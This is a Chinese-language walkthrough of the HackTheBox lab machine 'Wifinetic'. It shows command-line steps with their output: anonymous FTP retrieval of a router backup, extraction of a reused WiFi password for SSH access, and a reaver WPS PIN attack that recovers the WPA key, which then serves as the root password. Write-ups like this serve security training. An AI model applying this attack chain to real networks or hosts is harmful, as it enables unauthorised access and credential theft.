# 服务

```
┌──(root㉿kali)-[~]
└─# nmap -sV -Pn -A -O  10.10.11.247
Starting Nmap 7.93 ( https://nmap.org ) at 2024-08-19 04:25 EDT
Nmap scan report for 10.10.11.247
Host is up (0.34s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
53/tcp open  tcpwrapped

```

ftp可以匿名登录

把文件下载到本地，一个个翻查

发现一个用户名：netadmin
```
┌──(root㉿kali)-[~/htb/Wifinetic/etc]
└─# cat passwd  
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false

```

发现一个密码：VeRyUniUqWiFIPasswrd1!

```
┌──(root㉿kali)-[~/htb/Wifinetic/etc/config]
└─# cat wireless

config wifi-device 'radio0'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim0'
        option cell_density '0'
        option channel 'auto'
        option band '2g'
        option txpower '20'

config wifi-device 'radio1'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim1'
        option channel '36'
        option band '5g'
        option htmode 'HE80'
        option cell_density '0'

config wifi-iface 'wifinet0'
        option device 'radio0'
        option mode 'ap'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
        option wps_pushbutton '1'

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'

```

可以ssh登录

```
┌──(root㉿kali)-[~]
└─# ssh netadmin@10.10.11.247
The authenticity of host '10.10.11.247 (10.10.11.247)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:41: [hashed name]
    ~/.ssh/known_hosts:42: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.247' (ED25519) to the list of known hosts.
netadmin@10.10.11.247's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 19 Aug 2024 08:45:36 AM UTC

  System load:            0.08
  Usage of /:             64.5% of 4.76GB
  Memory usage:           6%
  Swap usage:             0%
  Processes:              227
  Users logged in:        0
  IPv4 address for eth0:  10.10.11.247
  IPv6 address for eth0:  dead:beef::250:56ff:fe94:6303
  IPv4 address for wlan0: 192.168.1.1
  IPv4 address for wlan1: 192.168.1.23

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Sep 12 12:46:00 2023 from 10.10.14.23
netadmin@wifinetic:~$ id
uid=1000(netadmin) gid=1000(netadmin) groups=1000(netadmin)

```

# 提权

对reaver这个命令有特权
reaver是一个wifi破解工具
```
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep

```

查看网卡
```
netadmin@wifinetic:~$ iw dev
phy#2
 Interface mon0
  ifindex 7
  wdev 0x200000002
  addr 02:00:00:00:02:00
  type monitor
  txpower 20.00 dBm
 Interface wlan2
  ifindex 5
  wdev 0x200000001
  addr 02:00:00:00:02:00
  type managed
  txpower 20.00 dBm
phy#1
 Unnamed/non-netdev interface
  wdev 0x1000000ba
  addr 42:00:00:00:01:00
  type P2P-device
  txpower 20.00 dBm
 Interface wlan1
  ifindex 4
  wdev 0x100000001
  addr 02:00:00:00:01:00
  ssid OpenWrt
  type managed
  channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
  txpower 20.00 dBm
phy#0
 Interface wlan0
  ifindex 3
  wdev 0x1
  addr 02:00:00:00:00:00
  ssid OpenWrt
  type AP
  channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
  txpower 20.00 dBm

```


使用reaver破解密码
```
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.
```


得到的wifi密码就是root密码
```
netadmin@wifinetic:~$ su root
Password: 
root@wifinetic:/home/netadmin# whoami
root

```